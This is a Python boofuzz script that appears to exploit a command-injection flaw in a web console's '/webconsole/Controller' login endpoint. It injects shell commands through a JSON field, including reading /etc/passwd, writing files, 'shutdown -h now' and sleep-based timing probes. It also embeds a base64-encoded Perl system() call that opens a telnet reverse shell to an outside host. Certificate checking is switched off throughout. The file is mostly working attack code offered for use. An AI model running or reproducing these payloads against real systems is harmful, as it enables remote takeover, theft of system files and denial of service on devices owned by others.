# -*- coding=utf-8 -*-
import json

from boofuzz import *
import ssl
import sys
import requests
import time
import urllib.parse

from requests.packages.urllib3.exceptions import InsecureRequestWarning, InsecurePlatformWarning
import warnings

# 过滤掉InsecureRequestWarning警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
requests.packages.urllib3.disable_warnings(InsecurePlatformWarning)

# 20240312 send packet ok, need optimization

warnings.filterwarnings("ignore", category=UserWarning)

# warnings.filterwarnings("ignore", category=UserWarning, module="boofuzz")  # python3 -W ignore
# t = 0

kw = '400'


# recommend this class to save variable between different callback functions
class ShareDate:
    def __init__(self):
        self.share_resp = None
        self.t = 0
        self.duration_t = 6


sd = ShareDate()


def gt(target, fuzz_data_logger, session, *args, **kwargs):
    # global t
    sd.t = time.time()


def keyword_check(target, fuzz_data_logger, session, *args, **kwargs):
    # have issue
    # print(f"keywords: {kw}")
    fuzz_data_logger.log_info(f"input keywords: {kw}")

    share_resp = sd.share_resp
    try:
        if share_resp:
            # check shared variable
            fuzz_data_logger.log_check(share_resp)
            if kw in share_resp:
                fuzz_data_logger.log_check(f">>>>> [Bingo!] Find keyword {kw} in response data...")
            fuzz_data_logger.log_check(session.last_send)
            # if 'redirectionURL' in target.recv(10240).decode():
            #     fuzz_data_logger.log_check(session.last_send)
    except:
        fuzz_data_logger.log_fail("Unable to connect ...")


def ad(target, fuzz_data_logger, session, *args, **kwargs):
    # get server response
    print('================= check server response ===================')

    response = target.recv(2048).decode()
    # global share_resp
    # share_resp = response
    # if not response:
    #     fuzz_data_logger.log_check(session.last_send)
    #     fuzz_data_logger.log_info(f"current test_case_count: {fuzz_data_logger.test_case_count}")

    sd.share_resp = response

    # print(type(response))   # str
    fuzz_data_logger.log_check(response)
    if "status" in response:
        ret = json.loads(response)
        if ret.get('status') == 200:
            fuzz_data_logger.info(f"[I] normal, status: {ret.get('status')}")
        elif ret.get('status') == "Session Expired":
            fuzz_data_logger.info(f"[I] Session Expired, status: {ret.get('status')}")
            # todo dev: if session expired, need call function to get new JSESSIONID and CSRF_TOKEN
    # print('===========================================================')

    # global t
    delta_t = time.time() - sd.t
    fuzz_data_logger.log_check(f"[D] cost {delta_t} seconds ...")
    if delta_t >= sd.duration_t:  # 3 is specific duration time, 1 second is system use
        print("delta time > specific seconds")
        fuzz_data_logger.log_check(
            ">>>>> [Bingo!] delta time > specific seconds, maybe sleep injection execute success")
        # print(session.last_send)
        # for check testcase send data
        fuzz_data_logger.log_check(session.last_send)
        fuzz_data_logger.log_info(f"current test_case_count: {fuzz_data_logger.test_case_count}")


# def resp(target, fuzz_data_logger, session, *args, **kwargs):
#
#     try:
#         fuzz_data_logger.log_check(target.recv(1024).decode())
#         print("~" * 33)
#         fuzz_data_logger.log_check(session.last_send)
#         # if 'redirectionURL' in target.recv(10240).decode():
#         #     fuzz_data_logger.log_check(session.last_send)
#     except:
#         fuzz_data_logger.log_fail("Unable to connect ...")
#         return


def extract_csrf_token(text):
    # page csrf key, refresh each visit
    s = text.find('c$rFt0k3n')
    e = text[s:].find(';')
    token = text[s + 13:s + e - 1]
    return token


def main():
    if len(sys.argv) != 3:
        sys.exit(
            'usage: {} target_ip port'.format(sys.argv[0]))

    print(sys.argv[1], sys.argv[2])

    ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    session = Session(target=Target(
        connection=SSLSocketConnection(host=sys.argv[1], port=int(sys.argv[2]), sslcontext=ctx, recv_timeout=15)),
        restart_threshold=1,
        # post_test_case_callbacks=[ad, keyword_check],
        post_test_case_callbacks=[ad],
        receive_data_after_fuzz=True,
        pre_send_callbacks=[gt],
        sleep_time=9,
        web_address="0.0.0.0",
        keep_web_open=True,
    )
    session.num_mutations(3)  # limit mutation count

    s_initialize(name='json_rce')

    # s_group("Method", ['POST'])
    # s_delim(" ", name='space-1', fuzzable=False)  # fuzz
    # # s_static(" ", name='space-1')  # static
    # s_static("/webconsole/Controller", name='Request-URI')
    #
    # s_delim(" ", name='space-2', fuzzable=False)  # fuzz
    # # s_static(" ", name='space-2')
    # s_static('HTTP/1.1', name='HTTP-Version')
    # s_static("\r\n", name="Request-Line-CRLF")

    s_static('POST ')
    s_static('/webconsole/Controller')
    s_static(' HTTP/1.1')
    s_static('\r\n', name='Request-Line-CRLF')

    s_static(f"Host: {sys.argv[1]}:{sys.argv[2]}\r\n")
    s_static("Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n")
    s_static("X-Requested-With: XMLHttpRequest\r\n")
    s_static("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0\r\n")
    s_static("Accept: application/json, text/javascript, */*; q=0.01\r\n")
    s_static("DNT: 1\r\n")

    s_static(f"Referer: https://{sys.argv[1]}:{sys.argv[2]}/webconsole/webpages/login.jsp\r\n")
    s_static("Accept-Encoding: gzip, deflate\r\n")
    s_static("Accept-Language: en-US,en;q=0.5\r\n")
    s_static("Connection: close\r\n")
    s_static(f"Cookie: JSESSIONID=8mlw3uxiwvqv1wqwh554humgo1\r\n")
    # s_static(f"X-Csrf-Token: {token}\r\n")

    s_static(f"Origin: https://{sys.argv[1]}:{sys.argv[2]}\r\n")

    # Content-Length must, but cannot test s_size
    # s_static(f"Content-Length: {s_size('body_content2', fuzzable=False, output_format='ascii')}\r\n")
    s_static(f"Content-Length: 486\r\n")

    # s_static("Sec-Fetch-Dest: empty\r\n")
    # s_static("Sec-Fetch-Mode: cors\r\n")
    # s_static("Sec-Fetch-Site: same-origin\r\n")
    # s_static("Te: trailers\r\n")

    # s_size('body_content', fuzzable=False, output_format='ascii')

    s_static("\r\n", name="Request-CRLF")

    # with s_block('body_content2'):
    # s_static(f"mode=151&json=%7B%22username%22%3A%22admin%22%2C%22password%22%3A%22x%22%2C%22languageid%22%3A%221%22%2C%22browser%22%3A%22Firefox_91%22%2C%22_discriminator%22%3A%7B%22curvalue%22%3A%22;")
    # sleep 5
    # s_static("mode=151&json=%7B%22username%22%3A%22admin%22%2C%22password%22%3A%22x%22%2C%22languageid%22%3A%221%22%2C%22browser%22%3A%22Firefox_91%22%2C%22_discriminator%22%3A%7B%22curvalue%22%3A%22;%60sleep%205%60%22%2C%22curKeyDisc%22%3A%7B%22curvalue%22%3A%22applicationfilterpolicyrules;use+MIME::Base64;system(decode_base64('dGVsbmV0IDE3Mi4xNi4xNi4xNjggNjc4OSB8IC9iaW4vc2ggfCB0ZWxuZXQgMTcyLjE2LjE2LjE2OCA4OTY3'))%22%7D%7D%2C%22value%22%3A%22curvalue%22%7D&__RequestType=ajax&t=1710331582506")

    # date > /tmp/111
    s_static(
        "mode=151&json=%7B%22username%22%3A%22admin%22%2C%22password%22%3A%22x%22%2C%22languageid%22%3A%221%22%2C%22browser%22%3A%22Firefox_91%22%2C%22_discriminator%22%3A%7B%22curvalue%22%3A%22;%60")
    # real fuzz logic, input can change in here todo dev 20240325
    # s_group("custom_cmd", ['cat%20%2Fetc%2Fpasswd%20%2Ftmp', 'id%20%3E%20%2Ftmp%2F11id', 'id%20%3E%20%2F1122id', 'shutdown -h now', 'sleep 3'])
    # root can, reboot and shutdown
    s_group("custom_cmd",
            ['cat%20%2Fetc%2Fpasswd%20%2Ftmp', 'id%20%3E%20%2Ftmp%2F11id', 'shutdown -h now', 'id%20%3E%20%2F1122id',
             'shutdown%20-h%20now', 'sleep 3'])
    s_static(
        "%60%22%2C%22curKeyDisc%22%3A%7B%22curvalue%22%3A%22applicationfilterpolicyrules;use+MIME::Base64;system(decode_base64('dGVsbmV0IDE3Mi4xNi4xNi4xNjggNjc4OSB8IC9iaW4vc2ggfCB0ZWxuZXQgMTcyLjE2LjE2LjE2OCA4OTY3'))%22%7D%7D%2C%22value%22%3A%22curvalue%22%7D&__RequestType=ajax&t=1711964681628")

    # s_static("&a=")   # just add for launch fuzzer
    # s_group("ava", ['a', 'b'])

    # timestamp = int(time.time())
    # # cmd = f'echo 111 > /tmp/{timestamp}.log'    # 20240124 test pass
    # cmd = f'date > /tmp/{timestamp}.log'    # 20240313 test pass
    # # cmd = f'sleep 5'  # 20240313 test pass  延时验证

    session.connect(s_get('json_rce'))
    session.fuzz(max_depth=1)
    print("---Test Real End Line----")


if __name__ == '__main__':
    main()
